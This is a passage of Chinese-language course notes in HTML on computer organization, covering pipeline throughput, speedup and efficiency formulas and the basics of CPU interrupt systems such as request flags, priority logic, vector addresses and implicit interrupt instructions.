alt="image-20240619202134351" style="zoom:50%;" /><p>假设指令3是转移指令，直到指令2结束才知道条件是否成立。指令4到指令7已经全部取出开始执行了，这些操作全部作废，在9到12时间单元没有结果输出，产生性能损失。</p><p>为了解决控制相关，我们一般使用猜测法尽早判断转移是否发生。这个方法很复杂，已经超出了教纲，可以自行查阅资料了解。</p><h4 id="流水线性能"><a class="markdownIt-Anchor" href="#流水线性能"></a> 流水线性能</h4><p>我们主要学习流水线性能的三个有关定义：吞吐量、加速比和效率。</p><h5 id="吞吐率"><a class="markdownIt-Anchor" href="#吞吐率"></a> 吞吐率</h5><p>吞吐率指单位时间内，流水线所完成指令或输出结果的数量。</p><p>设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>段流水线的各段时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">\Delta t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathnormal">t</span></span></span></span>。</p><ul><li><p>最大吞吐率为流水线连续流动达到稳定状态下的状态，即没有资源冲突，没有数据相关冲突，没有条转等，每经过一个t就有一个结果输出，有：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mrow><mi>p</mi><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow></mfrac><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">T_{pmax}=\frac{1}{\Delta t}\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span></span></span></p></li><li><p>实际吞吐率：连续处理 n 条指令的吞吐率为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>p</mi></msub><mo>=</mo><mfrac><mi>n</mi><mrow><mi>m</mi><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi><mo>+</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow></mfrac><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">T_p=\frac{n}{m·\Delta t+(n-1)·\Delta t}\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.215392em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mpunct mtight">⋅</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mpunct mtight">⋅</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span></span></span></p><p>第一条指令需要时间mt，如果流水线很理想，其后一条指令有（m-1）段都已经在执行完第一条指令后并发完成，故只需要额外t时间就可完成第二条指令。以此类推，除了第一条指令花费mt外，剩下的（n-1）条指令均只需要额外的一个t即可输出结果，总耗时为(n-1)·t</p></li></ul><p>仅当n&gt;&gt;m时，T<sub>p</sub>≈T<sub>pmax</sub></p><h5 id="加速比"><a class="markdownIt-Anchor" href="#加速比"></a> 加速比</h5><p>设加速比为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">S_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，定义加速比为 m 段的 <strong>流水线的速度</strong> 与等功能的 <strong>非流水线的速度</strong> 之比。</p><p>设流水线各段时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">\Delta t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathnormal">t</span></span></span></span></p><p>完成n条指令在m段流水线上一共需要：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mi>m</mi><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi><mo>+</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">T=m·\Delta t+(n-1)·\Delta t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">Δ</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">Δ</span><span class="mord mathnormal">t</span></span></span></span></p><p>完成n条指令在等效的非流水线上共需：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>T</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>=</mo><mi>n</mi><mi>m</mi><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">T^{&#x27;} =nm·\Delta t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">m</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">Δ</span><span class="mord mathnormal">t</span></span></span></span></p><p>则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>p</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mi>m</mi><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><mrow><mi>m</mi><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi><mo>+</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>n</mi><mi>m</mi></mrow><mrow><mi>m</mi><mo>+</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">S_p=\frac{nm·\Delta t}{m·\Delta t+(n-1)·\Delta t}=\frac{nm}{m+n-1}\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.392331em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mpunct mtight">⋅</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mpunct mtight">⋅</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">m</span><span class="mpunct mtight">⋅</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0987230000000001em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span></span></span></p><h5 id="效率"><a class="markdownIt-Anchor" href="#效率"></a> 效率</h5><p>效率即流水线中各功能段的利用率，由于流水线有建立时间和排空时间因此各功能段的设备不可能一直处于工作状态。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619204921547.png" alt="image-20240619204921547" style="zoom:50%;" /><p>定义效率：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mfrac><mtext>流水线各段处于工作状态的时间区</mtext><mtext>流水线各段总的空时间区</mtext></mfrac><mo>=</mo><mfrac><mrow><mi>m</mi><mi>n</mi><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><mrow><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow></mfrac><mspace linebreak="newline"></mspace><mo>=</mo><mfrac><mi>n</mi><mrow><mi>m</mi><mo>+</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac><mo>=</mo><mfrac><msub><mi>S</mi><mi>p</mi></msub><mi>m</mi></mfrac><mo>=</mo><msub><mi>T</mi><mi>p</mi></msub><mi mathvariant="normal">Δ</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">E=\frac{流水线各段处于工作状态的时间区}{流水线各段总的空时间区}=\frac{mn\Delta t}{m(m+n-1)\Delta t}\\=\frac{n}{m+n-1}=\frac{S_p}{m}=T_p\Delta t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">流</span><span class="mord cjk_fallback mtight">水</span><span class="mord cjk_fallback mtight">线</span><span class="mord cjk_fallback mtight">各</span><span class="mord cjk_fallback mtight">段</span><span class="mord cjk_fallback mtight">总</span><span class="mord cjk_fallback mtight">的</span><span class="mord cjk_fallback mtight">空</span><span class="mord cjk_fallback mtight">时</span><span class="mord cjk_fallback mtight">间</span><span class="mord cjk_fallback mtight">区</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">流</span><span class="mord cjk_fallback mtight">水</span><span class="mord cjk_fallback mtight">线</span><span class="mord cjk_fallback mtight">各</span><span class="mord cjk_fallback mtight">段</span><span class="mord cjk_fallback mtight">处</span><span class="mord cjk_fallback mtight">于</span><span class="mord cjk_fallback mtight">工</span><span class="mord cjk_fallback mtight">作</span><span class="mord cjk_fallback mtight">状</span><span class="mord cjk_fallback mtight">态</span><span class="mord cjk_fallback mtight">的</span><span class="mord cjk_fallback mtight">时</span><span class="mord cjk_fallback mtight">间</span><span class="mord cjk_fallback mtight">区</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.392331em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">n</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0987230000000001em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.330651em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.985651em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285716em;"><span style="top:-2.357em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">Δ</span><span class="mord mathnormal">t</span></span></span></span></p><p>其实就是<strong>实际吞吐率×各段用时</strong>。</p><h3 id="中断系统"><a class="markdownIt-Anchor" href="#中断系统"></a> 中断系统</h3><p>前面介绍过，采取中断的方式可以使CPU和I/O系统并行工作，提高效率。其实在实际运用中，除了I/O设备中断外，还有其他的中断。常见的中断类型如下：</p><ul><li>人为设置的中断，比如转管指令</li><li>程序性事故，比如溢出</li><li>硬件故障</li><li>I/O设备</li><li>外部事件，比如键盘中断</li></ul><p>中断系统为了处理这些中断，需要处理以下几个问题：</p><ol><li><p>各个中断源如何向CPU提出中断请求？</p><p>中断请求标记</p></li><li><p>多个中断源提出请求时，系统如何确定优先响应哪个中断源？</p><p>中断判优逻辑</p></li><li><p>CPU在什么条件、什么时候、以什么方式响应中断？</p><p>EINT、查询、中断向量表</p></li><li><p>CPU响应中断后如何保护现场？</p><p>中断隐指令</p></li><li><p>CPU响应中断后，如何停止原程序执行而转入中断服务程序的入口地址？</p><p>中断隐指令</p></li><li><p>中断处理结束后，CPU如何恢复现场，如何返回到原程序的中断处？</p><p>中断服务程序</p></li><li><p>中断处理过程中出现了新的中断，如何处理？</p><p>中断屏蔽技术</p></li></ol><p>接下来我们的内容将主要聚焦在解决这七个问题上。</p><p>（如果你学过8086汇编语言，你会发现这里的大多数问题在汇编语言的中断章节里都有介绍，如果你没有接触过汇编或者忘记了，可以参考这篇文章：<a href="https://adam8en.github.io/2024/06/12/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%B1%87%E7%BC%96%E5%91%B3%E5%B0%8F%E9%A5%BC%E5%B9%B2/#%E4%B8%AD%E6%96%AD">汇编味小饼干 | Adam8en の 8log</a>）</p><h4 id="中断请求标记"><a class="markdownIt-Anchor" href="#中断请求标记"></a> 中断请求标记</h4><p>中断系统通过设置中断请求标记触发器来判断是哪个中断源提出了中断要求，简称中断请求标记INTR。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619212012390.png" alt="image-20240619212012390" style="zoom:50%;" /><p>一个中断源对应一个INTR触发器，多个INTR组成中断请求标记寄存器。当触发器被设为1时，表明有对应中断请求。中断系统的触发器越多，代表计算机对中断的处理能力越完善。</p><p>INTR既可以集中在CPU的中断系统内，也可以分布在各个中断源的接口电路中。</p><h4 id="中断判优逻辑"><a class="markdownIt-Anchor" href="#中断判优逻辑"></a> 中断判优逻辑</h4><p>判优实现有两种：硬件实现和软件实现。</p><p>硬件实现（排队器）又分两种：一种分散在各个中断源的接口电路中，使用链式排队器进行优先级划分；一种集中在CPU内，按照优先顺序1、2、3、4排列。当最高级的INTR=1时，可以封住比它级别的的中断源的请求。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619212505410.png" alt="image-20240619212505410" style="zoom:50%;" /><p>软件实现即通过程序查询，从高到低逐级查询是否有中断请求，</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619212605092.png" alt="image-20240619212605092" style="zoom:50%;" /><h4 id="中断服务程序入口地址的查找"><a class="markdownIt-Anchor" href="#中断服务程序入口地址的查找"></a> 中断服务程序入口地址的查找</h4><p>同样分为硬件向量法和软件查询法两种。</p><p>硬件向量法，即用向量地址形成部件，输入排队器输出，输出中断向量地址。速度快，但灵活性低。</p><p>硬件向量法又有两种方法：</p><ol><li>中断向量地址包含一条跳转指令，跳转到入口地址</li><li>在内存某一地方保持了入口地址，要把它取出来，送入PC</li></ol><p>第二种方法允许用户修改中断向量表的入口地址，即更新中断例程，灵活性相对较高。因为速度更快，计算机大多使用硬件向量法定位入口程序地址。</p><p>软件查询法即编写对应的程序，内容由程序员编制，可以灵活改变优先级，但是查询速度慢。目前计算机可以灵活使用两种方法找到入口地址。</p><h4 id="中断响应"><a class="markdownIt-Anchor" href="#中断响应"></a> 中断响应</h4><h5 id="响应中断的条件"><a class="markdownIt-Anchor" href="#响应中断的条件"></a> 响应中断的条件</h5><p>允许中断触发器EINT=1时。（类似8086汇编中的IF标志位，可以用<code>sti</code>和<code>cli</code>设置）</p><h5 id="响应中断的时间"><a class="markdownIt-Anchor" href="#响应中断的时间"></a> 响应中断的时间</h5><p>在指令执行周期结束时刻，由CPU 发查询信号</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619213414922.png" alt="image-20240619213414922" style="zoom:50%;" /><h5 id="中断隐指令"><a class="markdownIt-Anchor" href="#中断隐指令"></a> 中断隐指令</h5><p>中断隐指令，主要指的是三个步骤：</p><ol><li><p>保护程序断点</p><p>断点存于内存的特定地址（0号地址）或者断点进栈</p></li><li><p>寻找服务程序入口地址</p><p>硬件向量法或者软件查询法</p></li><li><p>硬件关中断</p><ul><li>单重中断：执行中断服务程序时不再允许发生中断</li><li>多重中断：保护程序软硬件状态的过程中，不允许发生中断</li></ul></li></ol><p>为什么叫这三个操作为“隐指令”，是因为它们都由计算机的硬件自动完成，而不是在某一条具体指令的驱动下完成。</p><h4 id="保护和恢复现场"><a 